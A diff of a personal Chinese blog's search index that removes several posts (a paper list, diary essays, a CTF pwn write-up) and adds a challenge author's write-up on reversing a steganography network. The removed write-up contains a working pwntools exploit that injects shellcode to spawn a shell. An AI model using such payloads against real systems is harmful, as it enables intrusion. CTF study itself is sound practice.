@@ -55,25 +55,6 @@
       </tags>
   </entry>
   <entry>
-    <title>视觉、深度学习相关论文分享</title>
-    <url>/2024/04/11/AI-2.0-01/</url>
-    <content><![CDATA[<p><em>φ</em>(．．)</p>
-<ol>
-<li>Attention Is All You Need|2017</li>
-<li>An image is worth 16 x 16 words:transformers for image recognition at scale|2021|ICLR</li>
-<li>Masked Autoencoders Are Scalable Vision Learners|2022|CVPR</li>
-</ol>
-<blockquote>
-<p>更新：对于第一篇paper，你可能需要清楚什么是<code>Attention</code>,<code>encoder-decoder</code>,以及一些深度学习的基础知识。这样你会更快了解什么是<code>transformer</code><br>第二篇,你可能需要清楚什么是<code>patch</code>,<code>CNN</code>,以及一些CV的基础知识，他的成果基于<code>transformer</code>,所以也请大致知道<code>transformer</code>是什么。这样你会更快了解什么是<code>VIT</code><br>第三篇，你看到了<code>VIT</code>的无限潜力，在<code>Self-Supervised Learning</code>后，对于像素这样级别很低的输出依然有惊人的表现，这得益于它的非对称<code>encoder-decoder</code>，或许图片里的信息真的太冗余了呢？  </p>
-</blockquote>
-]]></content>
-      <tags>
-        <tag>CV</tag>
-        <tag>AI</tag>
-        <tag>Paper Reading</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Wandering</title>
     <url>/2024/06/22/Wandering/</url>
     <content><![CDATA[<p>(・ε・)</p>
@@ -484,48 +465,6 @@
       </tags>
   </entry>
   <entry>
-    <title>火车摇啊摇</title>
-    <url>/2024/05/07/%E4%BA%BA%E7%94%9F%E5%B0%8F%E6%BB%A1%EF%BC%8C%E6%97%A2%E6%98%AF%E5%9C%86%E6%BB%A1/</url>
-    <content><![CDATA[<p><em>_φ</em>_(．．)</p>
-<p>收到“杭电后勤生活”的推文，明天是小满，师生驿站有活动，还配上了“人生小满，既是圆满”的文案。</p>
-<p>一时感慨，想到之前想更的博客也没更，索性一并抒发了。</p>
-<h6 id="一"><a href="#一" class="headerlink" title="一"></a>一</h6><p>最先当说的应是高中生活，本就是这句“人生小满，既是圆满”一下把我的思绪拉到了高中。</p>
-<p>差不多去年今日，准备高考时买了一本作文书里面收录了一些和我调性相符还算认可的高考作文，这里还算认可的意思大概是说写得细腻，在限时考试的背景下我仍能从里面看到些许的文字的斟酌或者追求。</p>
-<p>扯远了，这样显得我写东西多清高了，不过文人相轻是常态嘛，也该轮到我清高清高了。</p>
-<p>那时读到有一篇议论文的立意就是“人生小满，既是圆满”，也一样是从节气、自然讲到人生，佐以中华传统文化等素材一道写的饱满充实。不过可能到现在我还是就记住了“人生小满”，也可能当时那些辞藻、结构、渲染就没看进去，当时神经衰弱（现在也神经衰弱）压力挺大的，也就只能看见“人生小满”。</p>
-<h6 id="二"><a href="#二" class="headerlink" title="二"></a>二</h6><p>说到压力大，我前段时间压力就还蛮大的，忙到天天被迫熬夜还看了两次凌晨四点的杭电，不过我还是忙里偷闲会写博客，反而五一忙完了就一直在睡觉或者打打游戏，总之称不上多有营养。</p>
-<p>在忙的时候，时常想着忙完了就狠狠更新博客，把这天上地下的都点评一番，我对象挺不能理解为什么我这么喜欢写博客，还要催他去开一个。除了可以偷窥他在干什么，对我而言博客的意义是这里的确是我可以把心剖开了的地方。这里是如同群聊一样的私域链接，也不会像群聊一样提示你谁更新了，后悔了也能直接撤了文章。我清楚地知道谁可能会看，我也不介意，能知道这个地址的朋友若是有心关心我，来看看我我也挺乐意的。</p>
-<h6 id="三"><a href="#三" class="headerlink" title="三"></a>三</h6><p>原本想要写的一篇，名字就叫“火车摇啊摇”，也就是现在这篇的名字。</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/pic/%E6%9D%AD%E5%B7%9E%E5%8D%97.png"
-                      alt="img.png"
-                ></p>
-<p>许久不坐绿皮车了，但我以前坐的实在多，以至于一上车闻到那股淡淡烟草味混合着微生物腐臭味的气息时，回忆能一下冲垮了我推论的思路。下午的正赛有点难打，我们是劣势持方，从结果评委的点评来看，我们的言辞需要更精准，论证需要更多环节，要将辩题外的东西来围猎对面，也需要讲辩题外的东西为什么可以讲。对于正方，他们只要简单的讲讲自己就好。</p>
-<p>我从没有为一场辩论模辩过三次，写四五千字的稿子，甚至于失掉辩论的自信。</p>
-<p>在此之前，我一直认为，辩论是一件我擅长却不敢兴趣的事，如果生活不冲突的话，在自己擅长的地方大杀四方当然畅快，但是如果冲突了，那我当然不会忙不感兴趣的事了。</p>
-<p>不过这“最后一场辩论”，让我连是否擅长辩论都不太确信了。或许是我的前置位队友不够给力，让我每次发言都很难受；或许是来找我的学姐言辞凛然，让我总觉得自己做得不够好；或许是真的就是太难了，这个辩题在网上你都找不到一场我方持方打赢的视频…………</p>
-<p>这“最后一场辩论”里我的表现，自我感觉是不好的。我问学长，“感觉我今天打的还没新生杯的时候好”，学长说，“怎么会呢，辩论肯定是越打越好的”。</p>
-<p>火车摇啊摇，胡思乱想。</p>
-<p>绿皮车的气味真是难闻，坐了几十上百次我还是没适应。如果不是我把一周半准备三个辩题误以为一周半准备一个辩题，我应当也不会接下这场全国范围的竞技辩，也不会退掉五一回上海的车票，而买了偏远的杭州南为了确保一定能在下午前到嘉兴比赛。</p>
-<p>杭州南，好像都是绿皮车。</p>
-<p>我记得以前在嘉兴-上海的绿皮车上，我也总爱胡思乱想，过去想想没写完的作业就像现在想想没推完的论，就连不知所措和时间紧迫的焦虑也大差不差。</p>
-<h6 id="四"><a href="#四" class="headerlink" title="四"></a>四</h6><p>输了辩论，但和辩论队的纠葛很难完全了断。</p>
-<p>协会的学长其实都觉得这是没什么大不了的小事，脸皮厚一点就好了。</p>
-<p>但我是个耳根子软的人，旁人随意说两句，我很容易就在意。就像现在准备转专业一样，原本坚定了一个半学期，但是有人在我面前真诚的说上两句，加上一个我确实没考虑过的角度，我就很听劝的开始咨询转专业。</p>
-<p>这种无条件无意义的在意，除了让我费神之外，也给我加上了一层社交体面的被动。“火车摇啊摇”，其实是朋友圈的真心话版，而朋友圈，只是宣告离别辩论的社交仪式。</p>
-<h6 id="五"><a href="#五" class="headerlink" title="五"></a>五</h6><p><em>*上传的时候发现这里被我手滑空格删掉了，那就这样吧，本来这段写的也不好,弥补的事少做一点，前进的事多做一点</em></p>
-<h6 id="六"><a href="#六" class="headerlink" title="六"></a>六</h6><p>人生小满，既是圆满。</p>
-<p>有感触还是因为觉得最近也算人生小满，说人生太大了，要把眼光放的局限一点，再局限一点。</p>
-<p>我5号染了个还不错的头，小满。</p>
-]]></content>
-      <tags>
-        <tag>喵喵</tag>
-        <tag>随笔</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>不定时更新小诗</title>
     <url>/2024/05/13/%E7%99%BD%E9%B8%9F%E8%BF%87%E6%B2%B3%E6%BB%A9/</url>
     <content><![CDATA[<p><em>_φ</em>_(．．)</p>
@@ -669,26 +608,6 @@
 <p><em>算是第一首词了，写得吃力，况且要对上“泪眼倚楼频独语”。这句“泪眼倚楼频独语”，直到现在也是大伙公认的绝赞上品，我也非常喜欢。</em></p></div></div></div>]]></content>
       <tags>
         <tag>白鸟</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>羽毛要飞升了</title>
-    <url>/2024/07/20/%E7%BE%BD%E6%AF%9B%E8%A6%81%E9%A3%9E%E5%8D%87%E4%BA%86/</url>
-    <content><![CDATA[<p><em>_φ</em>_(．．)</p>
-<p>好久好久没有写记录了，或者说更新喵喵这个tag了。</p>
-<p>毕竟这个tag记录的都是很个人的私事，哈哈。</p>
-<p>现在我的确很困了，但我还不想睡，可能是有话未说。</p>
-<p>最近生活又是有很大的更新？在一些关系上？在一些工作进展上？以及我感觉我的消化系统好像重启了。不得不说，从所有功能关闭到等他每个功能一个一个打开的过程真挺折磨人的，本来我的体重就意外到了这两年的历史新低，哈哈这下又要掉一点了。</p>
-<p>有的时候看到新生进群真的是感慨时间真的好快啊哈哈。我都变成管理员学姐了，尤其对我这种同期最后一批进入vidar的人来说。<br>虽然有人是大二才进入的，不过等到他们出题被压力拷打的时候其实也当是怎么说呢，混了挺久的了？哈哈。所以还是应该按上下半年来看。</p>
-<p>(╥﹏╥)<br>对于关系的变动尤为在意的在于就这样结束了？其实描述起来很浓墨重彩但是现实里很轻描淡写。就像这一整段关系一样。感觉会有不熟悉，但更多的是是为自己的果决和现实的干脆不可思议吧。</p>
-<p>赶在没有电脑之前把vidar娘皮套的1.0.0推了。(*´∀&#96;)~♥<br>当时还想着旅游回来赶紧把小毛病修了哈哈，结果忙的真的是像陀螺一样。这个新皮套其实有很多问题，我尤其不满意进了面捕之后很多效果都不对了，但是就像大家想的一样，的确，能全部流程走下了就很厉害啦。现在面世的1.0.0也是在未发布的base版上完全重做来的。很明显感受到因为是兼职所以没有明确的工作流导致效率经常突然十分低下（应该是偶尔高效）。<br>ʅ（´◔౪◔）ʃ重做的时候因为稍微明晰了一点点工作流所以稍微快一点点（，然而物理什么的还是。。害细节真的很多喵，live2d。</p>
-<p>在CV上可喜的算是我过去的经验还是很宝贵的，而且虽然认识很浅薄但是也没白学（，可悲的是我真的远程协作不了一点（，从各个角度来讲我现在还是不熟悉CLI实在是一件很不应该的事哈哈（不过也比当时好了一万倍了，可能我会对熟悉的要求比较高吧<br>而且做视觉以及美工熟悉点GUI怎么了（</p>
-<p>暑实好麻烦( ˘･з･)</p>
-<p>虽然旅游完有很多事要做我是知道的，但也没想到这么焦头烂额哈哈<br>和RT一起在做的比赛，草稿箱里欠着的largebin一篇，杂谈一篇，还有曾经的yolov8一些介绍，之前说要做的plaidctf复现，协会出题（期待1zs好兄弟），，，，，还有青协的事情哈哈，感觉刷两道pwn题或者再沉淀一下基础什么的都。。。。。我还是一直想重学一下自己学过的或者说，正在用的语言的？比如说python,不过这种事情很重要但是不紧急的话肯定永远被插队啦。</p>
-<p>羡慕睡得香的人。<br>晚安(￣o￣) . z Z</p>
-]]></content>
-      <tags>
-        <tag>喵喵</tag>
       </tags>
   </entry>
   <entry>
@@ -1152,23 +1071,6 @@
       </tags>
   </entry>
   <entry>
-    <title>省赛小记</title>
-    <url>/2024/11/04/%E7%9C%81%E8%B5%9B%E5%B0%8F%E8%AE%B0/</url>
-    <content><![CDATA[<p>O.o</p>
-<p>遗憾下播，会做一道，但是比赛的时候脑子抽风了，索性队伍不差我这100分所以没有难过到自责的地步。</p>
-<h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><p>受到之前做的题目影响有点大，，看到禁了syscall然后open,read过下意识以为侧信道相关</p>
-<p>不过没开沙箱，实际上利用手段非常多，0xa也比上次侧信道的0x6要多很多字节，最后半个小时想过换方法不过可能最近状态不好，最后0解下播。</p>
-<p>实际上是栈上脏数据reread,第二天重打还是挺快就通了的</p>
-<p>exp:</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf_path=<span class="string">&#x27;./shellcode&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p=remote(&quot;139.155.126.78&quot;,38696)</span></span><br><span class="line">p= process(elf_path)</span><br><span class="line"></span><br><span class="line">elf=ELF(elf_path)</span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">	pop rax</span></span><br><span class="line"><span class="string">	pop rdx</span></span><br><span class="line"><span class="string">	pop rsi</span></span><br><span class="line"><span class="string">	pop rsi</span></span><br><span class="line"><span class="string">	sub rax,0x41</span></span><br><span class="line"><span class="string">	call rax</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.send(shellcode)</span><br><span class="line">shellcode=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>) <span class="comment"># 第二次分配内存会在之前的上面加上0xa，但是写入还是从上次开始写，所以随便填个0xa的内存就行了</span></span><br><span class="line">shellcode+=asm(shellcraft.sh())</span><br><span class="line">p.sendafter(<span class="string">b&#x27;input: &#x27;</span>,shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
-<h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>后面还有两道，apple这道是高版本libc，但是洞是明显的。比赛的时候可能不太容易做出来，，或许应该抽时间深入学学io_file</p>
-]]></content>
-      <tags>
-        <tag>wp</tag>
-        <tag>Pwn</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>2024SCTF pwn题全解（上）</title>
     <url>/2024/10/12/SCTF-vmcode/</url>
     <content><![CDATA[<p>_(:3 」∠ )_</p>
@@ -1421,6 +1323,76 @@
 ]]></content>
       <tags>
         <tag>Pwn</tag>
+        <tag>出题手记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>d3image出题手记</title>
+    <url>/2025/06/02/d3image/</url>
+    <content><![CDATA[<h3 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h3><p>此题的预期解是选手能够意识对网络模型进行逆向建模，只需要正确写出反向的网络与运算规则，把题目给出的模型加载进新的框架即可得到flag。<br>在这样的情况下，选手端需要的资源并不多，仅需满足以下环境：</p>
+<ul>
+<li>Python 解释器版本需与题目要求的 PyTorch 版本匹配</li>
+<li>其余缺失库选择pip默认安装版本即可</li>
+<li>cuda并非必须的，你可以把所有的张量都移动到cpu上运算。</li>
+</ul>
+<p>在收到的 wp 中，很高兴大部分选手都使用了正确的思路，下面详细的解释一下这个思路的实现与可行性。</p>
+<p>首先，分析网络框架：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/20250601174309.png"
+                      alt="20250601174309"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/20250601174613.png"
+                      alt="20250601174613"
+                ></p>
+<p>每个block大致如上图，标注的文字信息与代码截图对应。</p>
+<ul>
+<li>蓝色部分：基础张量运算（均存在数学逆运算）；</li>
+<li>绿色箭头：输入输出变换（方向固定，不可逆）；</li>
+<li>黑色箭头：可逆运算路径。</li>
+</ul>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/20250601174825.png"
+                      alt="20250601174825"
+                ></p>
+<p>根据如上思路，我们只需要在 model.py，d3net.py 和 block.py 中作如下修改即可：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/20250601175335.png"
+                      alt="20250601175335"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/20250601175235.png"
+                      alt="20250601175235"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/20250601175216.png"
+                      alt="20250601175216"
+                ></p>
+<p>其次，dwt 与 iwt 在图像处理中本身就互为一对逆运算。</p>
+<p>最后，逆向网络还需要 y2 ,在题目附件中提供了一个名为 auxiliary_variable 的函数来辅助完成。经实验与数学验证，y2 可为任意与 y1 同形状的张量，不影响最终结果。</p>
+<p>修改后的decode如下：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">steg</span>):</span><br><span class="line">    output_steg = transform2tensor(steg)</span><br><span class="line">    output_steg = dwt(output_steg)</span><br><span class="line">    backward_z = gauss_noise(output_steg.shape)</span><br><span class="line"></span><br><span class="line">    output_rev = torch.cat((output_steg, backward_z), <span class="number">1</span>)</span><br><span class="line">    bacward_img = d3net(output_rev, rev=<span class="literal">True</span>)</span><br><span class="line">    secret_rev = bacward_img.narrow(<span class="number">1</span>, <span class="number">4</span> * <span class="number">3</span>, bacward_img.shape[<span class="number">1</span>] - <span class="number">4</span> * <span class="number">3</span>)</span><br><span class="line">    secret_rev = iwt(secret_rev)</span><br><span class="line"></span><br><span class="line">    image = secret_rev.view(-<span class="number">1</span>) &gt; <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    candidates = Counter()</span><br><span class="line">    bits = image.data.<span class="built_in">int</span>().cpu().numpy().tolist()</span><br><span class="line">    <span class="keyword">for</span> candidate <span class="keyword">in</span> bits_to_bytearray(bits).split(<span class="string">b&#x27;\x00\x00\x00\x00&#x27;</span>):</span><br><span class="line">        candidate = bytearray_to_text(<span class="built_in">bytearray</span>(candidate))</span><br><span class="line">        <span class="keyword">if</span> candidate:</span><br><span class="line">            candidates[candidate] += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(candidates) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&#x27;Failed to find message.&#x27;</span>)</span><br><span class="line">    candidate, count = candidates.most_common(<span class="number">1</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(candidate)</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="预期中的非预期解"><a href="#预期中的非预期解" class="headerlink" title="预期中的非预期解"></a>预期中的非预期解</h3><p>当然，由于这道题的定位是<code>趣味</code>，所以在这种需要看出可逆向的结构之外，亦可基于以下方法求解（力大砖飞需更高算力，但笔记本电脑可胜任）：</p>
+<p>具体做法是，选手自行选一个图像数据集，通过题目模型加密生成“密文-明文”配对数据；然后以加密数据为输入，原始数据为标签，训练一个自定义解密模型。</p>
+<p>这个方法的可行性在于，由于题目最终输出为二进制形式，解密问题被简化为二分类任务，再加上校验码可以降低对最后精确度的要求，所以对解密网络的训练难度与网络深度要求大大降低。</p>
+<p>如果题目是把图片隐写到图片里，那么训练一个解密网络的难度将会大大增加，因为本意只是想在一天内给选手们一个有趣的简单轻量AI题，专注在网络本身，而不是演变为算力比拼或者过于脑电波，所以在任务上没有继续加深难度，也给出了大部分的代码。</p>
+<p>非常遗憾也因为题目代码量较小，选手可以使用 AI 来理解工程代码，并快速的得到解答。但还是希望选手能够从中感受到题目本身“不需要训练 AI 的 AI 题”的趣味性。</p>
+<h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a class="link"   href="https://openaccess.thecvf.com/content/ICCV2021/html/Jing_HiNet_Deep_Image_Hiding_by_Invertible_Network_ICCV_2021_paper.html?ref=https://githubhelp.com" >HiNet: Deep Image Hiding by Invertible Network <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://arxiv.org/abs/1901.03892" >SteganoGAN: High Capacity Image Steganography with GANs <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+]]></content>
+      <tags>
+        <tag>Misc</tag>
         <tag>出题手记</tag>
       </tags>
   </entry>
